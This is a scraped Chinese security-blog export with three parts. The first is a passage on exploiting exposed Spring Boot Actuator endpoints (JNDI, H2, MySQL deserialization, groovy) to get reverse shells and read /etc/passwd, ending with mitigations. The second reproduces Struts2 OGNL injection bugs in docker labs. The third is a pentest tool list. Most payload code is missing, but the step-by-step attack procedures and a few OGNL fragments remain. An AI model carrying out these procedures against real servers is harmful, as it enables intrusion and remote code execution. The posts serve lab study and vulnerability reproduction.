步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell 步骤六：从外部 URL 地址加载日志配置文件 ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。 替换实际的 your-vps-ip 地址访问 URL 触发漏洞： 利用实例判断是否存在jolokia插件访问 是否存在 在/jolokia/list 接口搜索关键字： 读取敏感文件 创建xml文档logback.xml 请求访问fileread.dtd文件，192.168.233.1为服务器ip 将该xml放到服务器上，用于访问获取 创建文件fileread.dtd，读取/etc/passwd文件 在外部构造url访问，Payload如下： 可以看到返回的信息中存在etc/passwd的用户信息 如红框中所示 远程代码执行 可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI加载变量，导致了rce漏洞产生。rce的流程主要分为4步。 而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE的效果。 下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口 使用maven对java代码进行编译打包 打包成功 将上面打包的jar放到kali上，开启8090端口 使用nc开启监听1234端口 下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接 在浏览器中从外部构造url访问 浏览器返回结果如下: 可以看到kali下获取反弹的shell 注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。 利用原理 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞 详细分析参见下文: spring boot actuator rce via jolokia 2.5.createJNDIRealm RCE利用条件 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的服务器（请求可出外网） 普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过 利用方法步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。 步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java代码 步骤三： 打包java代码文件 将编辑好的java代码打包成jar包 步骤四：架设恶意 RMI服务 下载 marshalsec ，使用下面命令架设对应的 rmi 服务： 步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell 步骤六：发送恶意 payload 根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行 利用实例查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法 下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口 使用maven对java代码进行编译打包 打包成功 使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务 在kali上使用nc监听1234端口 使用exploit.py脚本对目标进行重放 代码如下: 在kali上使用python运行该脚本，指定目标ip地址和端口 该脚本运行成功后，可以看到kali的nc反弹shell成功 利用原理 创建 JNDIRealm 写入 contextFactory 为 RegistryContextFactory 写入 connectionURL 为你的 RMI Service URL 停止 Realm 启动 Realm 以触发 JNDI 注入 详细分析请参见 Yet Another Way to Exploit Spring Boot Actuators via Jolokia 2.6.restart h2 database query RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 存在 com.h2database.h2 依赖（版本要求暂未知） 利用方法步骤一：设置 spring.datasource.hikari.connection-test-query 属性 ⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发 spring 1.x（无回显执行命令） str1,str2和str3这三个参数组成要执行的命令 spring 2.x（无回显执行命令） 步骤二：重启应用 spring 1.x spring 2.x 利用实例首先判断在/env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query 构造Post请求/actuator/env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口 请求数据包如下: 注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行 在自己的主机上使用nc监听1234端口 构造请求/actuator/restart数据包，重启 重启后，可以看到目标连接成功 利用原理 spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句 restart 重启应用，会建立新的数据库连接 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞 详细分析参见下文 remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database 2.7restart spring.datasource.data h2 database RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 环境中需要存在 h2database、spring-boot-starter-data-jpa 相关依赖 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出 利用方法步骤一：编写sql 文件并托管 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如： ⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出 步骤二：设置 spring.datasource.data 属性 spring 1.x spring 2.x 步骤三：重启应用 spring 1.x spring 2.x 利用实例编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234 使用python开启http服务 POST方式构造请求数据包对/actuator/env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址 请求报文如下: 在调用/actuator/restart端点进行重启springboot项目 重启springboot后反弹shell成功 ![image-20210830181954887](C:\\Users\\ZR\\Desktop\\springboot\\Spring Boot Actuator未授权访问利用实战利用.assets\\image-20210830181954887.png) 利用原理 目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 spring-boot-autoconfigure组件中的org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java文件代码逻辑中会使用runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞 详细漏洞分析参见如下； repository/springboot-restart-rce 2.8.h2 database console JNDI RCE利用条件 存在 com.h2database.h2 依赖（版本要求暂未知） spring 配置中启用 h2 console spring.h2.console.enabled=true 目标可以请求攻击者的服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式） 利用方法步骤一：访问路由获得 jsessionid 直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。 步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的JAVA代码 步骤三：打包JAVA代码 将上面反弹shell的JAVA代码进行打包成jar包 步骤四：架设恶意 RMI服务 指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务： 步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell 步骤六：发包触发 JNDI 注入 根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 RMI://your-vps-ip:port/jndi 利用实例访问目标站点的/h2-console页面，url会跳转到/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5 这里的开启RMI服务JAVA代码如下: 反弹shell到192.168.233.242的1234端口 将该代码进行maven打包 然后指定访问ip地址开启RMI服务 使用nc监听端口 构造Post方式请求/h2-console/login.do?session=xxxx，请求报文中指定RMI服务的ip地址和端口 请求报文如下: 可以看到nc连接shell成功 利用原理 设置恶意url参数向h2-console/login.do?session=xxxx发出请求 服务器访问恶意url中的RMI服务，发生JNDI注入 RMI服务执行其他的恶意代码 详细分析参见 Spring Boot + H2数据库JNDI注入 2.9. mysql jdbc deserialization RCE 该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码) 利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标环境中存在 mysql-connector-java 依赖 目标可以请求攻击者的服务器（请求可出外网） 利用方法步骤一：查看环境依赖 GET 请求 /env 或 /actuator/env，搜索环境变量（classpath）中是否有 mysql-connector-java 关键词，并记录下其版本号（5.x 或 8.x）； 搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 commons-collections、Jdk7u21、Jdk8u20 等； 搜索 spring.datasource.url 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值。 步骤二：架设恶意 rogue mysql server 在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令： 这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下: 在脚本同目录下生成 payload.ser 反序列化 payload 文件，供脚本使用。 步骤三：设置 spring.datasource.url 属性 ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！ mysql-connector-java 5.x 版本设置属性值为： mysql-connector-java 8.x 版本设置属性值为： spring 1.x spring 2.x 步骤四：刷新配置 spring 1.x spring 2.x 步骤五：触发数据库查询 尝试访问网站已知的数据库查询的接口，例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发 步骤六：恢复正常 jdbc url 反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 spring.datasource.url 的原始 value 值 利用实例访问目标站点  查看环境变量设置和依赖 然后架设恶意 rogue mysql server，使用 ysoserial 自定义要执行的命令，讲生成的文件放置在 然后运行 springboot-jdbc-deserialization-rce.py 脚本开启3306端口 POST方式构造请求/actuator/env，设置spring.datasource.url为上面开启服务的ip地址 请求报文如下: 访问/actuator/refresh刷新配置 在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url 例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发 可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容 shell反弹成功 利用原理 spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址 refresh 刷新后设置了一个新的 spring.datasource.url 属性值 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞 详细漏洞分析参见下文 ​ New-Exploit-Technique-In-Java-Deserialization-Attack MySQL-JDBC 反序列化 | CN-SEC 中文网 2.10. restart logging.config logback JNDI RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出 ⚠️ JNDI 服务返回的 object 需要实现 javax.naming.spi.ObjectFactory 接口，否则会导致程序异常退出 利用方法步骤一：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 在根目录放置以 xml 结尾的 example.xml 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定： 步骤二：托管RMI服务及代码 编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口) 将上面反弹shell的JAVA代码进行打包成jar包 步骤三: 启动RMI服务 指定开启连接RMI服务的主机IP地址，架设RMI服务 步骤三：设置 logging.config 属性 spring 1.x spring 2.x 步骤四：重启应用 spring 1.x spring 2.x 利用实例编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下 然后使用python开启个简单的http服务 编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接 代码如下: 将该代码进行maven打包 ![image-20210830204556955](C:\\Users\\ZR\\Desktop\\springboot\\Spring Boot Actuator未授权访问利用实战利用.assets\\image-20210830204556955.png) 然后指定访问ip地址开启RMI服务 ![image-20210830204855751](C:\\Users\\ZR\\Desktop\\springboot\\Spring Boot Actuator未授权访问利用实战利用.assets\\image-20210830204855751.png) 使用nc监听端口 POST方式构造请求包对/actuator/env发出请求，设置logging.config为前面example.xml的请求地址 然后再访问/actuator/restart端点重新启动项目加载变量 此时就会看到连接shell成功 利用原理 目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址 restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞 2.11. restart logging.config groovy RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出 ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出 利用方法步骤一：托管 groovy 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 在根目录放置以 groovy 结尾的 example.groovy 文件，内容为需要执行的 groovy 代码，比如： 步骤二：设置 spring.main.sources 属性 spring 1.x spring 2.x 步骤三：重启应用 spring 1.x spring 2.x 利用实例编写groovy文件并将其放在http服务根目录下 使用python开启http服务 以POST的方式向/actuator/env请求，设置logging.config为groovy的url地址 请求报文如下 ![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831181920688.png) 在攻击主机上监听1234端口 然后向/actuator/restart请求重启项目 可以看到目标主机反向连接成功 利用原理 目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 logback-classic组件的ch.qos.logback.classic.util.ContextInitializer.java代码文件逻辑中会判断 url 是否以groovy` 结尾 如果 url 以 groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞 2.12. restart spring.main.sources groovy RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出 ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出 利用方法步骤一：托管 groovy 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 在根目录放置以 groovy 结尾的 example.groovy 文件，内容为需要执行的 groovy 代码，比如： 步骤二：设置 spring.main.sources 属性 spring 1.x spring 2.x 步骤三：重启应用 spring 1.x spring 2.x 利用实例编写groovy文件并将其放在http服务根目录下 使用python开启http服务 以POST的方式向/actuator/env请求，设置spring.main.sources为groovy的url地址 请求报文如下 在攻击主机上监听1234端口 然后向/actuator/restart请求重启项目 ![image-20210831180134395](C:\\Users\\ZR\\Desktop\\springboot\\Spring Boot Actuator未授权访问利用实战利用.assets\\image-20210831180134395.png) 可以看到目标主机反向连接成功 ![image-20210831180922722](C:\\Users\\ZR\\Desktop\\springboot\\Spring Boot Actuator未授权访问利用实战利用.assets\\image-20210831180922722.png) 利用原理 目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 spring-boot组件中的org.springframework.boot.BeanDefinitionLoader.java文件代码逻辑中会判断 url 是否以.groovy` 结尾 如果 url 以 .groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞 3.安全措施3.1开启security依赖功能在项目的pom.xml文件下引入spring-boot-starter-security依赖 然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。 3.2禁用接口如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上SpringBoot也提供了安全限制功能。比如要禁用/env接口，则可设置如下： endpoints.env.enabled= false 如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口： "},{"title":"Struts2漏洞复现总结","date":"2021-09-13T01:39:53.000Z","url":"/2021/09/13/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/","tags":[["Struts2漏洞复现总结","/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"Struts2漏洞复现总结简介Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。 S2-001该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 进入s2-001的docker漏洞环境 首先使用%&#123;&#39;test&#39;&#125;进行测试漏洞是否存在 返回了test，证明存在漏洞 使用payload进行测试，返回了tomcatBinDir&#123;/usr/local/tomcat&#125; 使用payload执行whoami 使用payload执行cat /etc/password命令 S2-005s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如： 触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下： S2-003 使用\\u0023绕过s2对#的防御 S2-003 后官方增加了安全模式（沙盒） S2-005 使用OGNL表达式将沙盒关闭，继续执行代码 影响版本: 2.0.0 - 2.1.8.1 进入s2-005的docker环境 抓包添加payload执行往/tmp/目录下写入success文件的操作 进入docker容器查看，在tmp目录下已经创建了success文件 S2-007在s2-007页面的文本框中，age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞 进入s2-007的docker漏洞环境 执行payload列出当前目录下的所有文件 添加payload执行whoami 也可以直接在age文本框处使用payload 即可得到id S2-008s2-008漏洞产生的原因，主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入?debug=command&amp;expression=即可执行OGNL表达式 进入s2-008的docker环境 在GET包处添加payload执行whoami S2-009Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\\u0023或\\43来绕过；后来Struts2对S2-005的修复方法是禁止\\等特殊符号，使用户不能提交反斜线。 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1的方法来执行它，从而绕过官方对#、\\等特殊字符的防御。 影响版本Struts 2.1.0-2.3.1.1 进入S2-009的docker环境 访问192.168.1.8:8080/ajax/example5，此为存在漏洞的界面 将payload拼接读取passwd文件 S2-012如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如： 这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行 进入s2-012的docker环境 直接在文本框内执行payload读取passwd 点击提交即可读取到passwd S2-013Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。 进入s2-013的docker环境 这里直接构造链接并进行url编码： 认准exec执行系统命令即可，flag在环境变量里面，构造： S2-015s2-015漏洞远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码 进入s2-015的docker环境 首先构造{1+1}得到payload 执行后自动编码得到如下，在message处会回显 构造payload显示id 这里在message处得到id需要进行url解码 S2-016在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令 进入s2-016的docker环境 构造payload执行，可以发现执行过后网址后面出现了id S2-032当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。method: Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。. 进入s2-032的docker环境 构造payload返回1001060253718则代表可代码执行 构造payload输出id S2-045Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。 影响范围 Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10 进入s2-045的docker环境 构造payload任意命令执行 对于payload的一些解释 来获取上下文容器 通过容器实例化，对Ognl API的通用访问，设置和获取属性 判断目标主机的操作系统类型，并进行执行命令赋值 执行攻击命令 S2-046s2-046漏洞的利用有点特殊，需要满足以下几个条件： 1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：&lt;constant name =“struts.multipart.parser”value =“jakarta-stream”/&gt; 2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB） 3、文件名内容构造恶意的 OGNL 内容。 如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。 与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。 进入s2-046的docker环境 点击submit进行抓包，可以看到这里的filename正常情况下是为空的 构造payload执行1+99 这里需要进行00截断，进入hex将30改为00 然后发包，可以看到X-Test这个地方已经执行了1+99并输出了结果 那么这里就可以构造一个poc进行bash反弹，还是要进行00阶段，nc监听端口，发包即可得到反弹shell S2-048这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。 而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同事这个 getText() 的 参数输入点，又可以被用户直接进行控制，用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。 进入s2-048的docker环境 进入漏洞页面，尝试运算1+1 可以看到这里得到了运算结果，说明存在漏洞 那么这里构造一个payload用来输出id 构造payload输出whoami S2-052s2-052产生漏洞的原因是REST插件使用到XStreamHandler处理xml数据，由于未对xml数据做任何过滤，在进行发序列xml数据转换为Object时导致RCE 进入s2-052的docker环境 进入页面后随便点击一个成员进行编辑并点击submit进行抓包 这里可以看到Content-Type为application/x-www-form-urlencoded 构造一个xml文件 首先将Content-Type改为application/xml，然后将xml文件插入，发包返回500证明已经成功 进入tmp目录查看success文件已经创建成功 S2-053s2-053漏洞产生的原因是Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。 进入s2-053的docker环境 首先执行%&#123;33-1&#125;并提交，可以看到在Your url的地方运算出了结果，说明存在漏洞 构造payload输出id并提交 执行bash反弹命令，用nc监听端口即可得到反弹shell S2-057s2-057漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。 alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性。 进入s2-057的docker环境 首先构造12+34回车 发现运算出了结果，说明存在漏洞 构造payload输出id 进行url编码 得到如下payload bp抓包在GET处进行拼接得到id 在exec处修改要执行得命令即可 S2-059s2-059产生的原因为攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。 进入s2-059的docker环境 访问8080看到有一个input:id 传参id=2进入发现出现在了input id:这个地方 这里构造id=%25&#123;10*10&#125;，发现自动进行了运算 使用bash反弹，先进行编码 编码后结果如下 生成一个test.py，将bash编码放入py 执行即可得到反弹shell S2-061s2-061漏洞产生的原因是Struts2 会对某些标签属性(比如 id，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %&#123;x&#125; 且 x 的值用户可控时，用户再传入一个 %&#123;payload&#125; 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过 进入s2-061的docker环境 还是构造一个%25&#123;10*10&#125;发现运算成功，证明漏洞存在 bp在index.action页面抓包 修改Content-Type如下并添加数据，这里如果直接使用GET方法是得不到回显的 改为POST方法即可得到id 配合dnslog食用同理 bash反弹命令需要先进行编码，同之前操作 nc监听端口即可得到反弹shell "},{"title":"Github渗透测试工具库-2021版","date":"2021-08-16T16:23:27.000Z","url":"/2021/08/17/Github%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93-2021%E7%89%88/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"1.前言今天看到一个博客里有这个置顶的工具清单，但是发现这些都是很早以前就有文章发出来的，我爬下来后一直放在txt里吃土。这里一起放出来。 2.漏洞练习平台WebGoat漏洞练习平台： webgoat-legacy漏洞练习平台: zvuldirll漏洞练习平台： vulapps漏洞练习平台： dvwa漏洞练习平台： 数据库注入练习平台 ： 用node编写的漏洞练习平台，like OWASP NodeGoat： Ruby编写的一款工具，生成含漏洞的虚拟机： 3.花式扫描器Nmap端口扫描器： 本地网络扫描器： 子域名扫描器： Linux漏洞扫描： 基于端口扫描以及关联CVE: 漏洞路由扫描器： 迷你批量信息泄漏扫描脚本： Waf类型检测工具： 服务器端口弱口令扫描器： Fox-scan扫描器： 4.信息搜集工具社工收集器： Github信息搜集： github Repo信息搜集工具： 信息探测及扫描工具： 内部网络信息扫描器： 远程桌面登录扫描器： 网络基础设施渗透工具： SNMAP密码破解: 5.WEBwebshell大合集： 渗透以及web攻击脚本： web渗透小工具大合集： XSS数据接收平台： XSS与CSRF工具： xss多功能扫描器： web漏洞扫描器: WEB漏洞扫描器： 渗透常用小工具包： web目录扫描器: web向命令注入检测工具： 自动化SQL注入检查工具： SSL扫描器： 安全工具集合： apache日志分析器： php代码审计工具： web指纹识别扫描： 检查网站恶意攻击： wordprees漏洞扫描器： 固件漏洞扫描器： 数据库注入工具： Web代理： 新版中国菜刀： git泄露利用EXP： 浏览器攻击框架： 自动化绕过WAF脚本： 一款开源WAF： http命令行客户端： 浏览器调试利器： DISCUZ漏洞扫描器： 自动化代码审计工具： 浏览器攻击框架： tomcat自动后门部署： 网络空间指纹扫描器： burpsuit之J2EE扫描插件： 6.Windows域渗透工具mimikatz明文注入： 